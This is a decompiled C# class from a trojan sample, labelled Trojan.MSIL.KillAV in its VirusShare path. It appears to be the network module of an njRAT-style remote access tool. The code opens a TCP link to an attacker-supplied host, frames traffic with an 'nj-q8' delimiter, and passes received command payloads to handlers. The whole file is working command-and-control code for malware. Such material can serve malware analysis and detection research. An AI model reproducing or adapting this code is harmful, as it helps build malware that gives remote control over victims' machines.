// Decompiled with JetBrains decompiler
// Type: nv.sk
// Assembly: nv, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D9D26A5E-13B6-4DC4-B014-052E2F5FE723
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.KillAV.ao-71e232c7af7ac92395beadd9c8a364c7e48a0978a010598a9978211f4ebd3b5a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

namespace nv
{
  public class sk
  {
    private static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    private byte[] Spl;
    public static Thread TH;

    public sk() => this.Spl = this.STB("nj-q8");

    public void AT(byte[] D) => T.A(ref D);

    public event sk.O0EventHandler O0;

    public event sk.O1EventHandler O1;

    public event sk.O2EventHandler O2;

    public void CN(string H, int P)
    {
      try
      {
        sk.client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        sk.client.BeginConnect(H, P, new AsyncCallback(this.C2), (object) sk.client);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        sk.O2EventHandler o2Event = this.O2Event;
        if (o2Event != null)
          o2Event();
        ProjectData.ClearProjectError();
      }
    }

    public void C1(byte[] D)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        memoryStream.Write(D, 0, D.Length);
        memoryStream.Write(this.Spl, 0, this.Spl.Length);
        memoryStream.ToArray();
        sk.client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
        memoryStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void DS()
    {
      try
      {
        sk.client.Shutdown(SocketShutdown.Both);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        sk.client.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public byte[] STB(string D) => Encoding.Default.GetBytes(D);

    public string BTS(byte[] D) => Encoding.Default.GetString(D);

    private void C2(IAsyncResult ar)
    {
      try
      {
        if (!sk.client.Connected)
        {
          sk.O2EventHandler o2Event = this.O2Event;
          if (o2Event == null)
            return;
          o2Event();
        }
        else
        {
          sk.client.ReceiveBufferSize = 99999;
          sk.client.ReceiveTimeout = -1;
          sk.client.SendTimeout = -1;
          sk.O0EventHandler o0Event;
          while (true)
          {
            do
            {
              Thread.Sleep(1);
              if (sk.TH == null)
                sk.TH = new Thread(new ThreadStart(this.D));
              if (sk.TH.ThreadState == ThreadState.Aborted | sk.TH.ThreadState == ThreadState.Unstarted | sk.TH.ThreadState == ThreadState.Stopped)
              {
                sk.TH = new Thread(new ThreadStart(this.D));
                sk.TH.Start();
                o0Event = this.O0Event;
                if (o0Event == null)
                  goto label_15;
                else
                  goto label_11;
              }
            }
            while (sk.TH.ThreadState != ThreadState.Running);
            sk.TH.Abort();
          }
label_15:
          return;
label_11:
          o0Event();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        sk.O2EventHandler o2Event = this.O2Event;
        if (o2Event != null)
          o2Event();
        ProjectData.ClearProjectError();
      }
    }

    public Array fx(ref byte[] buf)
    {
      Array[] arrayArray = new Array[2];
      MemoryStream memoryStream1 = new MemoryStream();
      string Right = "nj-q8";
      byte[] bytes = new byte[5];
      int num = checked (buf.Length - Right.Length);
      int count = 0;
      Array array;
      while (count <= num)
      {
        bytes[0] = buf[count];
        bytes[1] = buf[checked (count + 1)];
        bytes[2] = buf[checked (count + 2)];
        bytes[3] = buf[checked (count + 3)];
        bytes[4] = buf[checked (count + 4)];
        if (Operators.CompareString(Encoding.Default.GetString(bytes), Right, false) == 0)
        {
          memoryStream1.Dispose();
          MemoryStream memoryStream2 = new MemoryStream();
          MemoryStream memoryStream3 = new MemoryStream();
          memoryStream2.Write(buf, 0, count);
          if (checked (count + 5) != buf.Length)
          {
            memoryStream3.Write(buf, checked (count + 5), checked (buf.Length - count + 5));
            array = (Array) new object[2]
            {
              (object) memoryStream2.ToArray(),
              (object) memoryStream3.ToArray()
            };
            break;
          }
          array = (Array) new object[1]
          {
            (object) memoryStream2.ToArray()
          };
          break;
        }
        checked { ++count; }
      }
      return array;
    }

    public void D()
    {
      MemoryStream memoryStream = new MemoryStream();
label_1:
      int num;
      checked { ++num; }
      Thread.Sleep(5);
      try
      {
        if (num > 200)
        {
          try
          {
            if (sk.client.Poll(-1, SelectMode.SelectRead) & sk.client.Available <= 0)
            {
              O.Dis();
              return;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            O.Dis();
            ProjectData.ClearProjectError();
            return;
          }
          num = 0;
        }
        if (sk.client.Available > 0)
        {
          byte[] buffer = new byte[checked (sk.client.Available - 1 + 1)];
          sk.client.Receive(buffer, buffer.Length, SocketFlags.None);
          memoryStream.Write(buffer, 0, buffer.Length);
          while (true)
          {
            if (Strings.InStr(this.BTS(memoryStream.ToArray()), "nj-q8") > 0)
            {
              byte[] array = memoryStream.ToArray();
              Array Instance = this.fx(ref array);
              new Thread((ParameterizedThreadStart) (a0 => this.EFE((byte[]) a0))).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object) Instance, new object[1]
              {
                (object) 0
              }, (string[]) null)));
              memoryStream = new MemoryStream();
              if (Instance.Length == 2)
                memoryStream.Write((byte[]) NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 1
                }, (string[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 1
                }, (string[]) null), (Type) null, "length", new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
              else
                goto label_1;
            }
            else
              goto label_1;
          }
        }
        else
          goto label_1;
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          O.Dis();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    public void EFE(byte[] B)
    {
      sk.O1EventHandler o1Event = this.O1Event;
      if (o1Event == null)
        return;
      o1Event(B);
    }

    public bool CNT()
    {
      bool flag;
      try
      {
        flag = sk.client.Connected;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public delegate void O0EventHandler();

    public delegate void O1EventHandler(byte[] D);

    public delegate void O2EventHandler();
  }
}
